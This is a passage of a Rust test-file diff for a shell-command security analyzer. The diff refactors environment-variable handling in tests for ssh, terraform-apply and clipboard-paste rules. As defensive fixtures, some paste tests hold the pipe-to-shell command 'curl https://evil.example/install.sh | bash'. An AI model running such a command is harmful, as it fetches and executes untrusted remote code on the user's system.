-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-        std::env::remove_var("TIRITH_CONTEXT_DETECT_DISABLE");
-    }
+    global.set_env("KUBECONFIG", &kube_path);
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
+    global.remove_env("TIRITH_CONTEXT_DETECT_DISABLE");
     tirith_core::context_detect::invalidate_cache();
 
     let ctx = AnalysisContext {
@@ -2057,12 +2420,6 @@ fn context_rule_allows_kubectl_get_in_labeled_prod() {
     };
 
     let verdict = engine::analyze(&ctx);
-
-    unsafe {
-        std::env::remove_var("KUBECONFIG");
-        std::env::remove_var("TIRITH_POLICY_ROOT");
-    }
-    tirith_core::context_detect::invalidate_cache();
 
     let context_findings: Vec<_> = verdict
         .findings
@@ -2092,7 +2449,7 @@ fn context_rule_allows_kubectl_get_in_labeled_prod() {
 
 #[test]
 fn ssh_rule_blocks_destructive_on_labeled_host() {
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
     fs::create_dir_all(dir.path().join(".git")).unwrap();
@@ -2105,11 +2462,7 @@ fn ssh_rule_blocks_destructive_on_labeled_host() {
     )
     .unwrap();
 
-    // SAFETY: serialized via CONTEXT_TEST_LOCK. We set the policy-root env
-    // var so the engine's discovery walks into our temp dir's `.tirith/`.
-    unsafe {
-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-    }
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
 
     let ctx = AnalysisContext {
         input: "ssh payments-prod-01 'sudo systemctl restart payments'".to_string(),
@@ -2126,10 +2479,6 @@ fn ssh_rule_blocks_destructive_on_labeled_host() {
         clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
     };
     let verdict = engine::analyze(&ctx);
-
-    unsafe {
-        std::env::remove_var("TIRITH_POLICY_ROOT");
-    }
 
     let ssh_finding = verdict.findings.iter().find(|f| {
         matches!(
@@ -2151,7 +2500,7 @@ fn ssh_rule_blocks_destructive_on_labeled_host() {
 
 #[test]
 fn ssh_rule_emits_info_on_bare_labeled_host() {
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
     fs::create_dir_all(dir.path().join(".git")).unwrap();
@@ -2163,9 +2512,7 @@ fn ssh_rule_emits_info_on_bare_labeled_host() {
     )
     .unwrap();
 
-    unsafe {
-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-    }
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
 
     let ctx = AnalysisContext {
         input: "ssh payments-prod-01".to_string(),
@@ -2182,10 +2529,6 @@ fn ssh_rule_emits_info_on_bare_labeled_host() {
         clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
     };
     let verdict = engine::analyze(&ctx);
-
-    unsafe {
-        std::env::remove_var("TIRITH_POLICY_ROOT");
-    }
 
     let info_finding = verdict.findings.iter().find(|f| {
         matches!(
@@ -2208,7 +2551,7 @@ fn ssh_rule_emits_info_on_bare_labeled_host() {
 
 #[test]
 fn ssh_rule_allows_unlabeled_host_with_destructive_inner() {
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
     fs::create_dir_all(dir.path().join(".git")).unwrap();
@@ -2220,9 +2563,7 @@ fn ssh_rule_allows_unlabeled_host_with_destructive_inner() {
     )
     .unwrap();
 
-    unsafe {
-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-    }
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
 
     // Different host name — not in the labels file.
     let ctx = AnalysisContext {
@@ -2240,10 +2581,6 @@ fn ssh_rule_allows_unlabeled_host_with_destructive_inner() {
         clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
     };
     let verdict = engine::analyze(&ctx);
-
-    unsafe {
-        std::env::remove_var("TIRITH_POLICY_ROOT");
-    }
 
     let ssh_findings: Vec<_> = verdict
         .findings
@@ -2268,11 +2605,11 @@ fn ssh_rule_allows_unlabeled_host_with_destructive_inner() {
 
 // M8 ch3 — IaC apply-gate integration tests. Inject a temp `state_dir()` via
 // `XDG_STATE_HOME` so the plan-hash store is test-scoped, then exercise
-// `IacApplyWithoutPlan` / `IacPlanHashMismatch`. Share `CONTEXT_TEST_LOCK`.
+// `IacApplyWithoutPlan` / `IacPlanHashMismatch`.
 
 #[test]
 fn iac_rule_blocks_apply_without_plan_when_policy_on() {
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
     fs::create_dir_all(dir.path().join(".git")).unwrap();
@@ -2284,9 +2621,7 @@ fn iac_rule_blocks_apply_without_plan_when_policy_on() {
     )
     .unwrap();
 
-    unsafe {
-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-    }
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
 
     let ctx = AnalysisContext {
         input: "terraform apply".to_string(),
@@ -2303,10 +2638,6 @@ fn iac_rule_blocks_apply_without_plan_when_policy_on() {
         clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
     };
     let verdict = engine::analyze(&ctx);
-
-    unsafe {
-        std::env::remove_var("TIRITH_POLICY_ROOT");
-    }
 
     let iac_finding = verdict
         .findings
@@ -2326,7 +2657,7 @@ fn iac_rule_blocks_apply_without_plan_when_policy_on() {
 
 #[test]
 fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
     fs::create_dir_all(dir.path().join(".git")).unwrap();
@@ -2345,12 +2676,8 @@ fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
     // Temp XDG_STATE_HOME so this can't match a real recorded hash on the dev machine.
     let state_dir = dir.path().join("state");
     fs::create_dir_all(&state_dir).unwrap();
-    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
-
-    unsafe {
-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
-    }
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
+    global.set_env("XDG_STATE_HOME", &state_dir);
 
     let ctx = AnalysisContext {
         input: format!("terraform apply {}", plan_path.display()),
@@ -2367,14 +2694,6 @@ fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
         clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
     };
     let verdict = engine::analyze(&ctx);
-
-    unsafe {
-        std::env::remove_var("TIRITH_POLICY_ROOT");
-        match prev_xdg {
-            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
-            None => std::env::remove_var("XDG_STATE_HOME"),
-        }
-    }
 
     let mismatch_finding = verdict
         .findings
@@ -2397,7 +2716,7 @@ fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
 fn iac_rule_detects_plan_modification_after_record() {
     use tirith_core::iac_plan::{self, PlanSummary};
 
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
     fs::create_dir_all(dir.path().join(".git")).unwrap();
@@ -2415,13 +2734,8 @@ fn iac_rule_detects_plan_modification_after_record() {
 
     let state_dir = dir.path().join("state");
     fs::create_dir_all(&state_dir).unwrap();
-    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
-    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");
-
-    unsafe {
-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
-    }
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
+    global.set_env("XDG_STATE_HOME", &state_dir);
 
     // (a) Record the hash of the ORIGINAL file content.
     let summary = PlanSummary::default();
@@ -2468,17 +2782,6 @@ fn iac_rule_detects_plan_modification_after_record() {
     // (d) Modified file → mismatch.
     let v_modified = analyze(&format!("terraform apply {}", plan_path.display()));
 
-    unsafe {
-        match prev_policy_root {
-            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
-            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
-        }
-        match prev_xdg {
-            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
-            None => std::env::remove_var("XDG_STATE_HOME"),
-        }
-    }
-
     let modified_mismatch = v_modified
         .findings
         .iter()
@@ -2498,13 +2801,13 @@ fn iac_rule_detects_plan_modification_after_record() {
 // `AbsentOrInvalid`, and the engine must NOT re-read `clipboard_source.json`.
 // Plant a MATCHING sidecar (a disk read WOULD fire the rule), then prove
 // `AbsentOrInvalid` fires nothing while `Unread` (control) does fire — confirming
-// the record is genuinely matchable. Shares `CONTEXT_TEST_LOCK` (mutates XDG_STATE_HOME).
+// the record is genuinely matchable.
 #[test]
 fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
     use tirith_core::clipboard::ClipboardSourceState;
     use tirith_core::verdict::RuleId;
 
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     // A pipe-to-shell paste (reaches tier 3) with a destination host differing
     // from the recorded source — fires PasteSourceMismatch at HIGH if consulted.
@@ -2530,12 +2833,8 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
     fs::create_dir_all(policy_root.join(".tirith")).unwrap();
     fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();
 
-    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
-    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");
-    unsafe {
-        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
-        std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
-    }
+    global.set_env("XDG_STATE_HOME", &state_dir);
+    global.set_env("TIRITH_POLICY_ROOT", &policy_root);
 
     // Build a Paste context with the given tri-state (raw_bytes as the real path).
     let analyze_paste = |state: ClipboardSourceState| {
@@ -2559,17 +2858,6 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
     let absent = analyze_paste(ClipboardSourceState::AbsentOrInvalid);
     // Positive control: the SAME on-disk record IS matchable via the read path.
     let unread = analyze_paste(ClipboardSourceState::Unread);
-
-    unsafe {
-        match prev_xdg {
-            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
-            None => std::env::remove_var("XDG_STATE_HOME"),
-        }
-        match prev_policy_root {
-            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
-            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
-        }
-    }
 
     // AbsentOrInvalid: no re-read → no mismatch, despite the matching disk record.
     assert!(
@@ -2606,13 +2894,13 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
 // on matching-hash + DIFFERENT host (a non-matching hash bails at step 1, no
 // finding). So plant a disk record that says "legit" (matching hash + SAME host)
 // and hand the engine a different in-memory record (matching hash + DIFFERENT
-// host); the finding firing proves the in-memory record won. Shares `CONTEXT_TEST_LOCK`.
+// host); the finding firing proves the in-memory record won.
 #[test]
 fn paste_source_loaded_uses_in_memory_record_not_disk() {
     use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
     use tirith_core::verdict::RuleId;
 
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     // A pipe-to-shell paste (→ HIGH) with destination host `evil.example`.
     let paste = "curl https://evil.example/install.sh | bash";
@@ -2637,12 +2925,8 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
     fs::create_dir_all(policy_root.join(".tirith")).unwrap();
     fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();
 
-    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
-    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");
-    unsafe {
-        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
-        std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
-    }
+    global.set_env("XDG_STATE_HOME", &state_dir);
+    global.set_env("TIRITH_POLICY_ROOT", &policy_root);
 
     // In-memory record: matching hash (attribution proceeds) + DIFFERENT host
     // (`docs.trusted.example`) → host mismatch → finding.
@@ -2676,17 +2960,6 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
     // Control: with no tri-state record, the engine reads the disk record (same
     // host → no finding), proving the disk side genuinely says "legit".
     let unread = analyze_paste(ClipboardSourceState::Unread);
-
-    unsafe {
-        match prev_xdg {
-            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
-            None => std::env::remove_var("XDG_STATE_HOME"),
-        }
-        match prev_policy_root {
-            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
-            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
-        }
-    }
 
     // SECURITY-CRITICAL: the engine used the in-memory record (host mismatch),
     // not the benign disk record. A regression that re-reads disk fails here.
@@ -2724,13 +2997,13 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
 // M12 ch1 — companion: `Loaded(rec)` needs ZERO disk presence. With no sidecar
 // on disk, two `Loaded` records with the SAME paste give OPPOSITE verdicts from
 // their contents alone: matching-hash + different-host fires; non-matching-hash
-// bails at the step-1 guard. Shares `CONTEXT_TEST_LOCK`.
+// bails at the step-1 guard.
 #[test]
 fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
     use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
     use tirith_core::verdict::RuleId;
 
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let paste = "curl https://evil.example/install.sh | bash";
     // SHA-256 of `paste`; the non-matching record uses an all-zero hash.
@@ -2753,12 +3026,8 @@ fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
     fs::create_dir_all(policy_root.join(".tirith")).unwrap();
     fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();
 
-    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
-    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");
-    unsafe {
-        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
-        std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
-    }
+    global.set_env("XDG_STATE_HOME", &state_dir);
+    global.set_env("TIRITH_POLICY_ROOT", &policy_root);
 
     let analyze_paste = |state: ClipboardSourceState| {
         let ctx = AnalysisContext {
@@ -2797,17 +3066,6 @@ fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
         hidden_text_detected: false,
     };
     let suppressed = analyze_paste(ClipboardSourceState::Loaded(non_matching));
-
-    unsafe {
-        match prev_xdg {
-            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
-            None => std::env::remove_var("XDG_STATE_HOME"),
-        }
-        match prev_policy_root {
-            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
-            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
-        }
-    }
 
     // With no disk presence, the matching-hash + different-host record alone fires.
     assert!(
